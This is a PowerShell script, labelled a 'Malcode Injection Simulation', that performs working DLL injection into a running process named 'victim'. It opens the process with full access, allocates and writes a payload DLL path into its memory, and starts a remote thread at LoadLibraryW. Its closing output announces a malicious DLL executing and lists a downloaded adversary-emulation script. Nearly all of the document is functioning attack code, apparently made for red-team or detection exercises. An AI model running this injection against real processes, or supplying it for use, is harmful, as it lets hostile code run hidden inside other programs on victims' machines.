# injector.ps1
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class Inject {
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);
    
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    
    public const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
    public const uint MEM_COMMIT = 0x1000;
    public const uint MEM_RESERVE = 0x2000;
    public const uint PAGE_READWRITE = 0x04;
}
"@

Write-Host "========================================" -ForegroundColor Cyan
Write-Host "   Malcode Injection Simulation" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

Write-Host "[1/5] Searching for target process..." -ForegroundColor Yellow
Start-Sleep -Seconds 1

$target = Get-Process victim -ErrorAction Stop
$targetPID = $target.Id
$targetName = $target.ProcessName

Write-Host "      Target found: $targetName (PID: $targetPID)" -ForegroundColor Green
Write-Host ""
Start-Sleep -Seconds 1

Write-Host "[2/5] Opening process handle..." -ForegroundColor Yellow
$hProcess = [Inject]::OpenProcess([Inject]::PROCESS_ALL_ACCESS, $false, $targetPID)

if ($hProcess -eq [IntPtr]::Zero) {
    Write-Host "      Failed! Error code: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())" -ForegroundColor Red
    exit
}

Write-Host "      Handle: 0x$($hProcess.ToString('X'))" -ForegroundColor Green
Write-Host "      Access: PROCESS_ALL_ACCESS" -ForegroundColor Gray
Write-Host ""
Start-Sleep -Seconds 1

Write-Host "[3/5] Allocating memory in target..." -ForegroundColor Yellow
$dllPath = "C:\Users\Public\payload.dll"

if (-not (Test-Path $dllPath)) {
    Write-Host "      Error: payload.dll not found at $dllPath" -ForegroundColor Red
    exit
}

$dllBytes = [System.Text.Encoding]::Unicode.GetBytes($dllPath)
$size = $dllBytes.Length

$allocAddr = [Inject]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $size, 
    [Inject]::MEM_COMMIT -bor [Inject]::MEM_RESERVE, [Inject]::PAGE_READWRITE)

if ($allocAddr -eq [IntPtr]::Zero) {
    Write-Host "      Memory allocation failed!" -ForegroundColor Red
    exit
}

Write-Host "      VirtualAllocEx: 0x$($allocAddr.ToString('X'))" -ForegroundColor Green
Write-Host "      Size: $size bytes" -ForegroundColor Gray
Write-Host ""
Start-Sleep -Seconds 1

Write-Host "[4/5] Writing payload to memory..." -ForegroundColor Yellow
$written = 0
$result = [Inject]::WriteProcessMemory($hProcess, $allocAddr, $dllBytes, $size, [ref]$written)

if (-not $result) {
    Write-Host "      Write failed!" -ForegroundColor Red
    exit
}

Write-Host "      WriteProcessMemory: Success" -ForegroundColor Green
Write-Host "      Wrote: $written bytes" -ForegroundColor Gray
Write-Host ""
Start-Sleep -Seconds 1

Write-Host "[5/5] Creating remote thread..." -ForegroundColor Yellow
$kernel32 = [Inject]::GetModuleHandle("kernel32.dll")
$loadLib = [Inject]::GetProcAddress($kernel32, "LoadLibraryW")

Write-Host "      LoadLibraryW address: 0x$($loadLib.ToString('X'))" -ForegroundColor Gray

$threadId = [IntPtr]::Zero
$hThread = [Inject]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $loadLib, $allocAddr, 0, [ref]$threadId)

if ($hThread -eq [IntPtr]::Zero) {
    Write-Host "      Thread creation failed!" -ForegroundColor Red
    exit
}

Write-Host "      CreateRemoteThread: TID $threadId" -ForegroundColor Green
Write-Host ""
Start-Sleep -Seconds 2

Write-Host "========================================" -ForegroundColor Red
Write-Host "   Injection Complete!" -ForegroundColor Red
Write-Host "========================================" -ForegroundColor Red
Write-Host ""
Write-Host "[*] Malicious DLL loaded into target process" -ForegroundColor Red
Write-Host "[*] Payload executing in PID: $targetPID" -ForegroundColor Red
Write-Host ""
Write-Host "Check results:" -ForegroundColor Yellow
Write-Host "  - Log: C:\\Windows\\Temp\\injection_log.txt" -ForegroundColor White
Write-Host "  - Downloaded: C:\\Windows\\Temp\\sandcat_ttps7.ps1" -ForegroundColor White
Write-Host ""